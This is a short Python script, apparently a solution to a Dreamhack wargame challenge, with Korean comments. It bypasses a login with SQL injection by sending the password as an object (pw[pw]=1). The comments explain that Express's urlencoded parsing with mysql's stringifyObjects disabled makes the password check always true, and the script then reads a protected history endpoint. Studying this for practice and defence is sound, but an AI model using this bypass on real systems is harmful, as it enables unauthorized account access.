#!/usr/bin/env python3

import requests

URL = 'http://host3.dreamhack.games:22836'

auth_data = {'id': 'admin_inject', 'pw[pw]': 1}
# 위 방법이 헷갈릴 수 있다. 갑자기 배열을 넘긴다고?? 하면서 gpt도 그렇게 말했다;;;
# 근데 사실 저건 이거다. pw[pw]=1 다시 말해 Object라는 것이다.
# pw: {
# 	  pw: 1,
# 	}
# 그래서 만약에 stringifyObjects 옵션이 꺼져있다면... 위 방법으로 sql injection이 가능합니다.
# 참고로 그냥 이렇게 express.urlencoded()만 넣으면 stringifyObjects 옵션이 꺼져있기 때문에 sql injection에 많이 취약하다.
# 누가 과연 mysql로 db를 설정하고 node js에서 저 옵션을 끌까 생각했는데 내가 예전에 올렸던 프로젝트가 바로 그거였다...ㅋㅋㅋㅋㅋㅋㅋ
# good luck...🤣
# 로그인 시 pw의 값을 {'pw': 1}로 전달하면 pw = ? => pw = `pw` = 1로 치환되는데, 이는 (pw = pw) = 1과 동일하여 언제나 참인 조건문이 됩니다.

r = requests.Session()
r.post(URL+'/auth', data=auth_data)
print(r.get(URL+'/api/history/1').text)